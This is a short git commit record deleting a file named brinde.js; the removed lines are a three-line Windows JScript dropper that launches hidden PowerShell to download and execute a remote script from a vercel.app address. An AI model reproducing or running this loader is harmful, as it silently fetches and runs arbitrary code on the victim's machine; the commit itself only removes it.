b3c2a70a3898a18284e5d45b1b16347e47c8aa9e
corinthias <89884709+corinthias2025@users.noreply.github.com>
2025-07-29 12:44:51 -0300

    Delete brinde.js

--- brinde.js
+++
@@ -1,3 +0,0 @@
-var shell = new ActiveXObject("WScript.Shell");
-var ps = 'powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString(\'https://testando123-blond.vercel.app/arquivo.ps1\')"';
-shell.Run(ps, 0, false);
